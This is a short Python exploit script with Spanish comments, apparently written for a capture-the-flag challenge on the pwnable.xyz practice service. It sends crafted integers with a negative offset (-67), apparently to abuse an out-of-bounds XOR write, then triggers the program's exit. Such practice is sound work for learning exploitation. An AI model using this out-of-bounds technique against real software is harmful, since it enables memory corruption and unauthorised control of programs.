#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# Recibir banner
data = s.recv(1024)
print("Banner:", data.decode())

# Probar con offset -67
print("\nTest: XOR con offset -67")
a = 4702111234474986336
b = 4702111234474983745
c = -67
payload = f"{a} {b} {c}\n"
print(f"Enviando: {a} {b} {c}")
print(f"a XOR b = {a^b} = {hex(a^b)}")
s.sendall(payload.encode())

time.sleep(2)
try:
    resp = s.recv(1024)
    print(f"Respuesta: {resp.decode()}")
except Exception as e:
    print(f"Error: {e}")

# Si llegamos aquí, intentar triggerar exit
print("\nTriggerando exit...")
try:
    s.sendall(b"0 1 1\n")
    time.sleep(2)
    resp = s.recv(4096)
    print(f"Final: {resp.decode()}")
except Exception as e:
    print(f"Error final: {e}")

s.close()